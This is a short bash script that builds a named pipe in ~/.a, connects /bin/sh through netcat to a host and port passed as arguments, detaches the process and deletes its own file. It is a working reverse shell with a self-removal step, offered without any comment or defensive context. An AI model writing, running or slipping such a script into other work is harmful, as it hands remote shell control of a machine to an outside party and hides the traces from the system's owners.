#!/bin/bash
A="$0"
H=$1
P=$2
rm -rf ~/.a/
mkdir -p ~/.a/
mknod ~/.a/p p
/bin/sh -c /bin/sh 0<~/.a/p | nc $H $P 1>~/.a/p &
disown $!
rm -f "$A"
